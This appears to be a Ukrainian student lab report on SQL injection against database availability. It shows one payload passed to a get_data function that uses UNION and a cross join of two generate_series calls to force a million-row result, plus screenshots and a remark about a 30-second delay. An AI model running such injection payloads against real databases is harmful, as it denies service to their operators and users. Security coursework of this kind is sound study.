### Створити виклики функції з SQL-ін'єкціями з порушень доступності, приклади яких представлені в теоретичних відомостях.
### Створити знімки екранів з результатами виконання викликів функції та розмітити їх у файлі access_results.md у GitHub-репозиторії.

#### Програмний код:
`SELECT * FROM get_data('1'' UNION
(SELECT a1, CAST(a1 AS VARCHAR), CAST(a1 AS INTEGER)
FROM (SELECT generate_series a1 FROM generate_series (1,1000)) t1
CROSS JOIN (SELECT * FROM generate_series (1,1000) t2) t3) -- '); `

![image](https://user-images.githubusercontent.com/56130345/206293279-c6e9e0a2-47fc-4d57-80f1-1708cfed0db5.png)

![image](https://user-images.githubusercontent.com/56130345/206293520-dc04571a-a69c-44ba-9f3c-7be8d1d7cf94.png)

Через 30 секунд:

![image](https://user-images.githubusercontent.com/56130345/206293554-fe076cc6-f67c-435c-931c-8adb572075e8.png)
